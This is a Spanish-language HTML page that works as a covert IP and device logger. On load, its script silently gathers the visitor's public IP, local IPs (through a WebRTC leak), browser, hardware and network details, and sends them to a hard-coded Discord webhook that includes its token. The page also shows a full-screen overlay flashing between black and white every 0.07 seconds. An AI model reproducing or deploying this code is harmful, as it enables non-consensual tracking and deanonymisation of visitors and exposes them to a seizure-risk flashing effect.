<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Parpadeo</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      min-height: 100vh;
      background-image: url('bg.jpg');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
    }

    .parpadeo-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: rgba(255, 255, 255, 0);
      pointer-events: none;
      z-index: 9999;
      animation: flashBlancoNegroOpaco 0.07s infinite alternate;
    }

    @keyframes flashBlancoNegroOpaco {
      0% {
        background-color: rgba(255, 255, 255, 0.7);
      }
      100% {
        background-color: rgba(0, 0, 0, 0.7);
      }
    }
  </style>
</head>
<body>
  <div class="parpadeo-overlay"></div>

  <script>
    // Función para obtener la IP del usuario mediante API pública
    async function getIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.error('Error obteniendo IP:', error);
        return 'No disponible';
      }
    }

    // Función para obtener información del navegador y sistema (sin permisos)
    function getBrowserInfo() {
      const info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(', ') : 'No disponible',
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack || 'No especificado',
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        screenColorDepth: window.screen.colorDepth,
        windowWidth: window.innerWidth,
        windowHeight: window.innerHeight,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        date: new Date().toLocaleString(),
        referrer: document.referrer || 'Directo',
        url: window.location.href,
        hostname: window.location.hostname,
        pathname: window.location.pathname,
        protocol: window.location.protocol
      };
      return info;
    }

    // Función para obtener IP local mediante WebRTC (sin permisos)
    function getLocalIPs() {
      return new Promise((resolve) => {
        const ips = [];
        const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
        if (!RTCPeerConnection) {
          resolve(['No soportado']);
          return;
        }
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (event) => {
          if (!event || !event.candidate) {
            resolve(ips.length > 0 ? ips : ['No disponible']);
            return;
          }
          const candidate = event.candidate.candidate;
          if (candidate) {
            const ipMatch = candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
            if (ipMatch && !ips.includes(ipMatch[0])) {
              ips.push(ipMatch[0]);
            }
          }
        };
        setTimeout(() => {
          resolve(ips.length > 0 ? ips : ['No disponible']);
        }, 3000);
      });
    }

    // Obtener plugins del navegador (sin permisos)
    function getPlugins() {
      try {
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
          plugins.push(navigator.plugins[i].name);
        }
        return plugins.join(', ') || 'Sin plugins';
      } catch (e) {
        return 'No disponible';
      }
    }

    // Obtener memoria RAM (si está disponible)
    function getMemory() {
      try {
        if (navigator.deviceMemory) {
          return navigator.deviceMemory + ' GB';
        }
        return 'No disponible';
      } catch (e) {
        return 'No disponible';
      }
    }

    // Obtener número de núcleos
    function getCores() {
      try {
        return navigator.hardwareConcurrency || 'No disponible';
      } catch (e) {
        return 'No disponible';
      }
    }

    // Obtener conexión de red (sin permisos)
    function getConnection() {
      try {
        if (navigator.connection) {
          const conn = navigator.connection;
          return {
            type: conn.effectiveType || 'No disponible',
            downlink: conn.downlink ? conn.downlink + ' Mbps' : 'No disponible',
            rtt: conn.rtt ? conn.rtt + ' ms' : 'No disponible'
          };
        }
        return { type: 'No disponible', downlink: 'No disponible', rtt: 'No disponible' };
      } catch (e) {
        return { type: 'No disponible', downlink: 'No disponible', rtt: 'No disponible' };
      }
    }

    // Función principal para recolectar todos los datos (sin permisos)
    async function collectData() {
      const ip = await getIP();
      const browserInfo = getBrowserInfo();
      const localIPs = await getLocalIPs();
      const plugins = getPlugins();
      const memory = getMemory();
      const cores = getCores();
      const connection = getConnection();

      const data = {
        ip: ip,
        localIPs: localIPs,
        browser: browserInfo,
        plugins: plugins,
        memory: memory,
        cores: cores,
        connection: connection,
        timestamp: new Date().toISOString()
      };

      return data;
    }

    // Función para enviar a Discord mediante webhook
    async function sendToDiscord(data) {
      // CAMBIA ESTA URL POR LA DE TU WEBHOOK DE DISCORD
      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1352504992581689414/ksDEYv3ICIOtlK6PqqBekdVCgb-bpWmhwaQ8cQ2gR_YlVf0OjSl41N7CpwRI32Lm1SWq';

      const embed = {
        title: '📊 Nuevo visitante',
        color: 0x5865F2,
        fields: [
          {
            name: '🌐 IP Pública',
            value: data.ip,
            inline: true
          },
          {
            name: '🖥️ IPs Locales',
            value: data.localIPs.join(', '),
            inline: true
          },
          {
            name: '🖱️ User Agent',
            value: data.browser.userAgent.substring(0, 256),
            inline: false
          },
          {
            name: '💻 Plataforma',
            value: data.browser.platform,
            inline: true
          },
          {
            name: '🌍 Idioma',
            value: data.browser.language,
            inline: true
          },
          {
            name: '🕒 Zona Horaria',
            value: data.browser.timezone,
            inline: true
          },
          {
            name: '📐 Resolución',
            value: `${data.browser.screenWidth}x${data.browser.screenHeight}`,
            inline: true
          },
          {
            name: '🔗 URL',
            value: data.browser.url,
            inline: false
          },
          {
            name: '📅 Fecha/Hora',
            value: data.browser.date,
            inline: true
          },
          {
            name: '🍪 Cookies',
            value: data.browser.cookieEnabled ? 'Activadas' : 'Desactivadas',
            inline: true
          },
          {
            name: '🔄 Referrer',
            value: data.browser.referrer || 'Directo',
            inline: false
          },
          {
            name: '🧩 Plugins',
            value: data.plugins.substring(0, 200),
            inline: false
          },
          {
            name: '💾 RAM',
            value: data.memory,
            inline: true
          },
          {
            name: '⚙️ Núcleos',
            value: data.cores,
            inline: true
          },
          {
            name: '📶 Conexión',
            value: `Tipo: ${data.connection.type}\nVelocidad: ${data.connection.downlink}\nRTT: ${data.connection.rtt}`,
            inline: false
          }
        ],
        footer: {
          text: `Timestamp: ${data.timestamp}`
        }
      };

      const payload = {
        embeds: [embed]
      };

      try {
        console.log('Enviando datos a Discord...');
        const response = await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });

        if (!response.ok) {
          const errorText = await response.text();
          console.error('Error enviando a Discord - Status:', response.status, 'Mensaje:', errorText);
          throw new Error(`HTTP error! status: ${response.status}`);
        } else {
          console.log('✅ Datos enviados a Discord correctamente');
        }
      } catch (error) {
        console.error('❌ Error en la petición a Discord:', error.message);
      }
    }

    // Ejecutar cuando la página cargue
    window.addEventListener('load', async () => {
      try {
        console.log('Iniciando recolección de datos...');
        const data = await collectData();
        console.log('Datos recolectados:', data);
        await sendToDiscord(data);
      } catch (error) {
        console.error('❌ Error en el proceso:', error);
      }
    });

    // También ejecutar inmediatamente por si el evento load falla
    (async function init() {
      try {
        console.log('Iniciando recolección de datos (immediate)...');
        const data = await collectData();
        console.log('Datos recolectados (immediate):', data);
        await sendToDiscord(data);
      } catch (error) {
        console.error('❌ Error en el proceso (immediate):', error);
      }
    })();
  </script>
</body>
</html>
